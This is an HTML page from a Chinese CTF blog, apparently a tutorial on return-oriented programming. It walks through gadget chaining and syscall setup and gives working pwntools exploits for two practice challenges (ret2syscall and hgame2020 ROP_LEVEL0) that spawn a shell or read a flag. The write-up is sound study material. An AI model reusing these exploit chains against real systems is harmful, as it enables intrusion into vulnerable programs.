@@ -1,0 +1,1057 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="Pwn基础----ROP, F0und">
+    <meta name="description" content="ROP  (Return Oriented Programming)0x00 ROP－－修改返回地址，让其指向内存中已有的一段指令
+根据上面副标题的说明，要完成的任务包括：在内存中确定某段指令的地址，并用其覆盖返回地址。可是既然可以覆盖返回">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>Pwn基础----ROP | F0und</title>
+    <link rel="icon" type="image/png" href="/medias/fav.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    <style type="text/css">
+        
+    </style>
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">F0und</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>首页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>归档</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>关于</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/friends" class="waves-effect waves-light">
+            
+            <i class="fa fa-address-book"></i>
+            
+            <span>友情链接</span>
+        </a>
+    </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
+        </a>
+    </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">F0und</div>
+        <div class="logo-desc">
+            
+            今天不学习，明天变垃圾
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                首页
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                标签
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                分类
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                归档
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                关于
+            </a>
+        </li>
+        
+        <li>
+            <a href="/friends" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-address-book"></i>
+                
+                友情链接
+            </a>
+        </li>
+        
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        Pwn基础----ROP
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+</style>
+<div class="row">
+    <div class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/ctf/" target="_blank">
+                                <span class="chip bg-color">ctf</span>
+                            </a>
+                        
+                            <a href="/tags/pwn/" target="_blank">
+                                <span class="chip bg-color">pwn</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CTF/" class="post-category" target="_blank">
+                                CTF
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-02-17
+                </div>
+
+                
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
+                        3.8k
+                    </div>
+                    
+
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                        17 分
+                    </div>
+                    
+                
+				
+				
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="ROP-Return-Oriented-Programming"><a href="#ROP-Return-Oriented-Programming" class="headerlink" title="ROP  (Return Oriented Programming)"></a>ROP  (Return Oriented Programming)</h1><h2 id="0x00-ROP"><a href="#0x00-ROP" class="headerlink" title="0x00 ROP"></a>0x00 ROP</h2><p><em>－－修改返回地址，让其指向内存中已有的一段指令</em></p>
+<p>根据上面副标题的说明，要完成的任务包括：在内存中确定某段指令的地址，并用其覆盖返回地址。可是既然可以覆盖返回地址并定位到内存地址，为什么不直接用上篇提到的 return2libc 呢？因为有时目标函数在内存内无法找到，有时目标操作并没有特定的函数可以完美适配。这时就需要在内存中寻找多个指令片段，拼凑出一系列操作来达成目的。假如要执行某段指令（我们将其称为“gadget”，意为小工具），溢出数据应该以下面的方式构造：</p>
+<blockquote>
+<p><strong>payload :</strong> <em>padding + address of gadget</em></p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220132.png" alt=""></p>
+<h2 id="0x10-包含单个-gadget-的溢出数据"><a href="#0x10-包含单个-gadget-的溢出数据" class="headerlink" title="0x10 包含单个 gadget 的溢出数据"></a>0x10 包含单个 gadget 的溢出数据</h2><p>如果想连续执行若干段指令，就需要每个 gadget 执行完毕可以将控制权交给下一个 gadget。所以 gadget 的最后一步应该是 RET 指令，这样程序的控制权（eip）才能得到切换，所以这种技术被称为返回导向编程( <strong>R</strong>eturn <strong>O</strong>riented <strong>P</strong>rogramming )。要执行多个 gadget，溢出数据应该以下面的方式构造：</p>
+<blockquote>
+<p><strong>payload :</strong> padding + address of gadget 1 + address of gadget 2 + …… + address of gadget n</p>
+</blockquote>
+<p>在这样的构造下，被调用函数返回时会跳转执行 gadget 1，执行完毕时 gadget 1 的 RET 指令会将此时的栈顶数据（也就是 gadget 2 的地址）弹出至 eip，程序继续跳转执行 gadget 2，以此类推。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220143.png" alt=""></p>
+<h2 id="0x20-包含多个-gadget-的溢出数据"><a href="#0x20-包含多个-gadget-的溢出数据" class="headerlink" title="0x20 包含多个 gadget 的溢出数据"></a>0x20 包含多个 gadget 的溢出数据</h2><p>现在任务可以分解为：针对程序栈溢出所要实现的效果，找到若干段以 ret 作为结束的指令片段，按照上述的构造将它们的地址填充到溢出数据中。所以我们要解决以下几个问题。</p>
+<p>首先，栈溢出之后要实现什么效果？</p>
+<p>ROP 常见的拼凑效果是实现一次系统调用，Linux系统下对应的汇编指令是 int 0x80。执行这条指令时，被调用函数的编号应存入 eax，调用参数应按顺序存入 ebx，ecx，edx，esi，edi 中。例如，编号125对应函数</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">mprotect (void *addr, size_t len, int prot)
+</code></pre>
+<p>，可用该函数将栈的属性改为可执行，这样就可以使用 shellcode 了。假如我们想利用系统调用执行这个函数，eax、ebx、ecx、edx 应该分别为“125”、内存栈的分段地址（可以通过调试工具确定）、“0x10000”（需要修改的空间长度，也许需要更长）、“7”（RWX 权限）。</p>
+<p>其次，如何寻找对应的指令片段？</p>
+<p>有若干开源工具可以实现搜索以 ret 结尾的指令片段，著名的包括 <strong>ROPgadget</strong>、<strong>rp++</strong>、<strong>ropeme</strong> 等，甚至也可以用 grep 等文本匹配工具在汇编指令中搜索 ret 再进一步筛选。搜索的详细过程在这里就不再赘述，有兴趣的同学可以参考上述工具的说明文档。</p>
+<p>最后，如何传入系统调用的参数？</p>
+<p>对于上面提到的 mprotect 函数，我们需要将参数传输至寄存器，所以可以用 pop 指令将栈顶数据弹入寄存器。如果在内存中能找到直接可用的数据，也可以用 mov 指令来进行传输，不过写入数据再 pop 要比先搜索再 mov 来的简单，对吧？如果要用 pop 指令来传输调用参数，就需要在溢出数据内包含这些参数，所以上面的溢出数据格式需要一点修改。对于单个 gadget，pop 所传输的数据应该在 gadget 地址之后，如下图所示。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220134.png" alt=""></p>
+<h2 id="0x30-gadget-“pop-eax-ret-”"><a href="#0x30-gadget-“pop-eax-ret-”" class="headerlink" title="0x30 gadget “pop eax; ret;”"></a>0x30 gadget “pop eax; ret;”</h2><p>在调用 mprotect() 为栈开启可执行权限之后，我们希望执行一段 shellcode，所以要将 shellcode 也加入溢出数据，并将 shellcode 的开始地址加到 int 0x80 的 gadget之后。但确定 shellcode 在内存的确切地址是很困难的事（想起上篇里面艰难试探的过程了吗？），我们可以使用 push esp 这个 gadget（加入可以找到的话）。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220133.png" alt=""></p>
+<h2 id="0x40-gadget-“push-esp-ret-”"><a href="#0x40-gadget-“push-esp-ret-”" class="headerlink" title="0x40 gadget “push esp; ret;”"></a>0x40 gadget “push esp; ret;”</h2><p>我们假设现在内存中可以找到如下几条指令：</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">pop eax; ret;    # pop stack top into eax
+pop ebx; ret;    # pop stack top into ebx
+pop ecx; ret;    # pop stack top into ecx
+pop edx; ret;    # pop stack top into edx
+int 0x80; ret;   # system call
+push esp; ret;   # push address of shellcode
+</code></pre>
+<p>对于所有包含 pop 指令的 gadget，在其地址之后都要添加 pop 的传输数据，同时在所有 gadget 最后包含一段 shellcode，最终溢出数据结构应该变为如下格式。</p>
+<blockquote>
+<p><strong>payload :</strong> padding + address of gadget 1 + param for gadget 1 + address of gadget 2 + param for gadget 2 + …… + address of gadget n + shellcode</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220146.png" alt=""></p>
+<h2 id="0x50-包含多个-gadget-的溢出数据（修改后）"><a href="#0x50-包含多个-gadget-的溢出数据（修改后）" class="headerlink" title="0x50 包含多个 gadget 的溢出数据（修改后）"></a>0x50 包含多个 gadget 的溢出数据（修改后）</h2><p>此处为了简单，先假定输入溢出数据不受“\x00”字符的影响，所以 payload 可以直接包含 “\x7d\x00\x00\x00”（传给 eax 的参数125）。如果希望实现更为真实的操作，可以用多个 gadget 通过运算得到上述参数。比如可以通过下面三条 gadget 来给 eax 传递参数。</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">pop eax; ret;         # pop stack top 0x1111118e into eax
+pop ebx; ret;         # pop stack top 0x11111111 into ebx
+sub eax, ebx; ret;    # eax -= ebx
+</code></pre>
+<p>解决完上述问题，我们就可以拼接出溢出数据，输入至程序来为程序调用栈开启可执行权限并执行 shellcode。同时，由于 ROP 方法带来的灵活性，现在不再需要痛苦地试探 shellcode 起始地址了。回顾整个输入数据，只有栈的分段地址需要获取确定地址。如果利用 gadget 读取 ebp 的值再加上某个合适的数值，就可以保证溢出数据都具有可执行权限，这样就不再需要获取确切地址，也就具有了绕过内存随机化的可能。</p>
+<p>出于演示的目的，我们假设（简直是<em>钦点</em>）了所有需要的 gadget 的存在。在实际搜索及拼接 gadget 时，并不会像上面一样顺利，有两个方面需要注意。</p>
+<p>第一，很多时候并不能一次凑齐全部的理想指令片段，这时就要通过数据地址的偏移、寄存器之间的数据传输等方法来“曲线救国”。举个例子，假设找不到下面这条 gadget</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">pop ebx; ret;
+</code></pre>
+<p>但假如可以找到下面的 gadget</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">mov ebx, eax; ret;
+</code></pre>
+<p>我们就可以将它和</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">pop eax; ret;
+</code></pre>
+<p>组合起来实现将数据传输给 ebx 的功能。上面提到的用多个 gadget 避免输入“\x00”也是一个实例应用。</p>
+<p>第二，要小心 gadget 是否会破坏前面各个 gadget 已经实现的部分，比如可能修改某个已经写入数值的寄存器。另外，要特别小心 gadget 对 ebp 和 esp 的操作，因为它们的变化会改变返回地址的位置，进而使后续的 gadget 无法执行。</p>
+<h2 id="0x60-example1-easy"><a href="#0x60-example1-easy" class="headerlink" title="0x60 example1 (easy)"></a>0x60 example1 (easy)</h2><p>本题同样来自于CTF-wiki上的一道练习：ret2syscall</p>
+<p>题目源码</p>
+<pre class=" language-lang-c"><code class="language-lang-c">#include &lt;stdio.h>
+#include &lt;stdlib.h>
+
+char *shell = "/bin/sh";
+
+int main(void)
+{
+    setvbuf(stdout, 0LL, 2, 0LL);
+    setvbuf(stdin, 0LL, 1, 0LL);
+
+    char buf[100];
+
+    printf("This time, no system() and NO SHELLCODE!!!\n");
+    printf("What do you plan to do?\n");
+    gets(buf);
+
+    return 0;
+}
+</code></pre>
+<p>程序开启NX保护==&gt;栈中数据不可执行</p>
+<p>程序给了”/bin/sh”字符串</p>
+<p>没有给出system()函数,静态链接文件</p>
+<p>因此只能使用我们的ROP了，让程序跳到系统调用上</p>
+<p>通过上面的知识我们可以知道我们可以通过构造gadget来实现操作</p>
+<p>首先拟出我们需要的汇编指令</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">pop eax; ret  0xb
+pop ebx; ret  /bin/sh
+pop ecx; ret  0
+pop edx; ret  0
+int 80h
+</code></pre>
+<p>使用ROPgadget 在程序中找出这些指令</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">ROPgadget --binary rop --only "pop|ret"| grep ebx
+</code></pre>
+<pre class=" language-lang-txt"><code class="language-lang-txt">0x080bb196 : pop eax ; ret
+
+0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
+
+0x08049421 : int 0x80
+</code></pre>
+<p>字符串bin/sh的地址在IDA中就可以查看，也可以通过ROPgadget —string查看</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">0x080BE408
+</code></pre>
+<p>payload:</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">payload='a'*offset+ p32(0x080bb196) + p32(0xb) +p32(0x0806eb90)+ p32(0)+p32(0)+p32(0x080BE408)+p32(0x08049421)
+</code></pre>
+<p>另一种解法：</p>
+<p>直接生成ropchain</p>
+<pre class=" language-lang-python"><code class="language-lang-python">from struct import pack
+
+# Padding goes here
+p = ''
+
+p += pack('&lt;I', 0x0806eb6a) # pop edx ; ret
+p += pack('&lt;I', 0x080ea060) # @ .data
+p += pack('&lt;I', 0x080bb196) # pop eax ; ret
+p += '/bin'
+p += pack('&lt;I', 0x0809a4ad) # mov dword ptr [edx], eax ; ret
+p += pack('&lt;I', 0x0806eb6a) # pop edx ; ret
+p += pack('&lt;I', 0x080ea064) # @ .data + 4
+p += pack('&lt;I', 0x080bb196) # pop eax ; ret
+p += '//sh'
+p += pack('&lt;I', 0x0809a4ad) # mov dword ptr [edx], eax ; ret
+p += pack('&lt;I', 0x0806eb6a) # pop edx ; ret
+p += pack('&lt;I', 0x080ea068) # @ .data + 8
+p += pack('&lt;I', 0x08054590) # xor eax, eax ; ret
+p += pack('&lt;I', 0x0809a4ad) # mov dword ptr [edx], eax ; ret
+p += pack('&lt;I', 0x080481c9) # pop ebx ; ret
+p += pack('&lt;I', 0x080ea060) # @ .data
+p += pack('&lt;I', 0x0806eb91) # pop ecx ; pop ebx ; ret
+p += pack('&lt;I', 0x080ea068) # @ .data + 8
+p += pack('&lt;I', 0x080ea060) # padding without overwrite ebx
+p += pack('&lt;I', 0x0806eb6a) # pop edx ; ret
+p += pack('&lt;I', 0x080ea068) # @ .data + 8
+p += pack('&lt;I', 0x08054590) # xor eax, eax ; ret
+p += pack('&lt;I', 0x0807b5bf) # inc eax ; ret
+p += pack('&lt;I', 0x0807b5bf) # inc eax ; ret
+p += pack('&lt;I', 0x0807b5bf) # inc eax ; ret
+p += pack('&lt;I', 0x0807b5bf) # inc eax ; ret
+p += pack('&lt;I', 0x0807b5bf) # inc eax ; ret
+p += pack('&lt;I', 0x0807b5bf) # inc eax ; ret
+p += pack('&lt;I', 0x0807b5bf) # inc eax ; ret
+p += pack('&lt;I', 0x0807b5bf) # inc eax ; ret
+p += pack('&lt;I', 0x0807b5bf) # inc eax ; ret
+p += pack('&lt;I', 0x0807b5bf) # inc eax ; ret
+p += pack('&lt;I', 0x08049421) # int 0x80
+
+from pwn import *
+
+context.log_level="debug"
+
+sh=process('./rop')
+
+sh.sendlineafter("What do you plan to do?\n",'a'*112 + p)
+
+sh.interactive()
+</code></pre>
+<p><strong>PS：本人在运行完这个脚本后虚拟机暴毙了，连着我一台kali还有我配置的pwn专用全部坏了，具体原因还没搞清，建议先拍个快照使用，或者放到docker里面跑，血的教训，还好里边没有什么重要的文件，难受！！</strong></p>
+<p>报错如下：</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">set_thread_area failed when setting up thread-local storage
+</code></pre>
+<h2 id="0x70-example2-mid"><a href="#0x70-example2-mid" class="headerlink" title="0x70 example2(mid)"></a>0x70 example2(mid)</h2><p>本题来自于hgame2020 week1 pwn ROP_LEVEL0</p>
+<pre class=" language-lang-TXT"><code class="language-lang-TXT">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v3; // eax@1
+  char buf; // [sp+0h] [bp-50h]@1
+  int v6; // [sp+38h] [bp-18h]@1
+  int fd[2]; // [sp+48h] [bp-8h]@1
+
+  memset(&buf, 0, 0x38uLL);
+  v6 = 0;
+  setbuf(_bss_start, 0LL);
+  v3 = open("./some_life_experience", 0);
+  *(_QWORD *)fd = v3;
+  read(v3, &buf, 0x3CuLL);
+  puts(&buf);
+  read(0, &buf, 0x100uLL);
+  return 0;
+}
+</code></pre>
+<pre class=" language-lang-txt"><code class="language-lang-txt">__int64 vuln()
+{
+  char buf; // [sp+0h] [bp-10h]@1
+
+  read(0, &buf, 0xA0uLL);
+  return 0LL;
+}
+</code></pre>
+<p>题目提供两个函数，都是read()溢出,开启NX，无栈保护</p>
+<p>file:</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">ROP_LEVEL0: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1baedaba8bde71a65a2f781f56a833ccd5388e24, not stripped
+</code></pre>
+<p>64位可执行动态链接文件，64位文件溢出姿势 <a href="https://bbs.ichunqiu.com/article-1767-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/article-1767-1.html</a></p>
+<p>这道题可以使用ret2libc的方法做，但在这里我们理解官方做法,官方EXP：</p>
+<pre class=" language-lang-python"><code class="language-lang-python">#!/usr/bin/env python
+#-*-coding:utf-8-*-
+
+from pwn import *
+context.log_level = 'debug'
+p=process("./ROP_LEVEL0")
+#p = remote('47.103.214.163',20003)
+elf = ELF("ROP_LEVEL0")
+'''
+Gadgets information
+============================================================
+0x000000000040074c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040074e : pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000400750 : pop r14 ; pop r15 ; ret
+0x0000000000400752 : pop r15 ; ret
+0x000000000040074b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040074f : pop rbp ; pop r14 ; pop r15 ; ret
+0x00000000004005a0 : pop rbp ; ret
+0x0000000000400753 : pop rdi ; ret
+0x0000000000400751 : pop rsi ; pop r15 ; ret
+0x000000000040074d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004004c9 : ret
+0x0000000000400532 : ret 0x200a
+0x000000000040067e : ret 0x4804
+'''
+pop_rsi_r15_ret = 0x0000000000400751
+pop_rdi_ret = 0x0000000000400753
+read_plt = elf.plt['read']
+open_plt = elf.plt['open']
+puts_plt = elf.plt['puts']
+buf_addr = 0x601060#参考read的参数，要一个类似指针的buf
+
+payload = 'a'*(0x50+8)
+    #栈溢出
+payload += p64(pop_rsi_r15_ret)+p64(buf_addr)+p64(0)
+    #buf值存入64位第二个传参寄存器rsi
+payload += p64(read_plt)+p64(pop_rdi_ret)+p64(buf_addr)+p64(pop_rsi_r15_ret)+p64(0)*2
+    #调用read并填入参数
+payload += p64(open_plt)+p64(pop_rdi_ret)+p64(4)+p64(pop_rsi_r15_ret)+p64(buf_addr)*2
+    #调用open并填入参数
+payload += p64(read_plt)+p64(pop_rdi_ret)+p64(buf_addr)+p64(puts_plt)
+    #再次调用read读取flag
+p.sendline(payload)
+p.sendline('./flag\x00')
+p.interactive()
+</code></pre>
+<h2 id="0x80-ROPgadget-命令"><a href="#0x80-ROPgadget-命令" class="headerlink" title="0x80 ROPgadget 命令"></a>0x80 ROPgadget 命令</h2><pre class=" language-lang-txt"><code class="language-lang-txt">usage: ROPgadget [-h] [-v] [-c] [--binary &lt;binary>] [--opcode &lt;opcodes>]
+                 [--string &lt;string>] [--memstr &lt;string>] [--depth &lt;nbyte>]
+                 [--only &lt;key>] [--filter &lt;key>] [--range &lt;start-end>]
+                 [--badbytes &lt;byte>] [--rawArch &lt;arch>] [--rawMode &lt;mode>]
+                 [--offset &lt;hexaddr>] [--ropchain] [--thumb] [--console]
+                 [--norop] [--nojop] [--nosys] [--multibr] [--all]
+
+description:
+  ROPgadget lets you search your gadgets on a binary. It supports several 
+  file formats and architectures and uses the Capstone disassembler for
+  the search engine.
+
+formats supported: 
+  - ELF
+  - PE
+  - Mach-O
+  - Raw
+
+architectures supported:
+  - x86
+  - x86-64
+  - ARM
+  - ARM64
+  - MIPS
+  - PowerPC
+  - Sparc
+
+optional arguments:
+  -h, --help           show this help message and exit
+  -v, --version        Display the ROPgadget's version
+  -c, --checkUpdate    Checks if a new version is available
+  --binary &lt;binary>    Specify a binary filename to analyze
+  --opcode &lt;opcodes>   Search opcode in executable segment
+  --string &lt;string>    Search string in readable segment
+  --memstr &lt;string>    Search each byte in all readable segment
+  --depth &lt;nbyte>      Depth for search engine (default 10)
+  --only &lt;key>         Only show specific instructions
+  --filter &lt;key>       Suppress specific instructions
+  --range &lt;start-end>  Search between two addresses (0x...-0x...)
+  --badbytes &lt;byte>    Rejects specific bytes in the gadget's address
+  --rawArch &lt;arch>     Specify an arch for a raw file
+  --rawMode &lt;mode>     Specify a mode for a raw file
+  --offset &lt;hexaddr>   Specify an offset for gadget addresses
+  --ropchain           Enable the ROP chain generation
+  --thumb              Use the thumb mode for the search engine (ARM only)
+  --console            Use an interactive console for search engine
+  --norop              Disable ROP search engine
+  --nojop              Disable JOP search engine
+  --nosys              Disable SYS search engine
+  --multibr            Enable multiple branch gadgets
+  --all                Disables the removal of duplicate gadgets
+
+examples:
+  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 
+  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --ropchain
+  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --depth 3
+  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --string "main"
+  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --string "m..n"
+  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --opcode c9c3
+  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --only "mov|ret"
+  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --only "mov|pop|xor|ret"
+  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --filter "xchg|add|sub"
+  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --norop --nosys
+  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --range 0x08041000-0x08042000
+  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --string main --range 0x080c9aaa-0x080c9aba
+  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --memstr "/bin/sh"
+  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --console
+  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --badbytes "00|7f|42"
+  ROPgadget.py --binary ./test-suite-binaries/Linux_lib64.so --offset 0xdeadbeef00000000
+  ROPgadget.py --binary ./test-suite-binaries/elf-ARMv7-ls --depth 5
+  ROPgadget.py --binary ./test-suite-binaries/elf-ARM64-bash --depth 5
+  ROPgadget.py --binary ./test-suite-binaries/raw-x86.raw --rawArch=x86 --rawMode=32
+</code></pre>
+<h2 id="0x90-Linux-系统调用"><a href="#0x90-Linux-系统调用" class="headerlink" title="0x90 Linux 系统调用"></a>0x90 Linux 系统调用</h2><p>linux 的系统调用通过 int80 实现，用系统调用来区分入口函数</p>
+<p>应用程序执行系统调用的过程是：</p>
+<ol>
+<li>把系统调用的编号存入EAX</li>
+<li>把函数参数存入其他调用寄存器</li>
+<li>触发 0x80 号中断</li>
+</ol>
+<p>那么我们如果只希望通过系统调用来获取shell就需要把系统调用的参数放入各个寄存器，然后执行 int 0x80h 就可以了</p>
+<p>如果说通过系统调用执行的是：execve(“/bin/sh”,NULL,NULL)32位程序</p>
+<p>那么EAX中存放的应该是系统调用的编号，查看execve的系统调用号</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">cat /usr/include/asm/unistd_32.h |grep execve
+</code></pre>
+<p>即0xb</p>
+<p>其他：</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">ebx /bin/sh
+ecx 0
+edx 0
+</code></pre>
+<h2 id="0x100-汇编指令补充"><a href="#0x100-汇编指令补充" class="headerlink" title="0x100 汇编指令补充"></a>0x100 汇编指令补充</h2><p>一些最常用的汇编指令如下：</p>
+<ul>
+<li>MOV：数据传输指令，将 SRC 传至 DST，格式为</li>
+</ul>
+<pre class=" language-lang-txt"><code class="language-lang-txt">MOV DST, SRC;
+</code></pre>
+<ul>
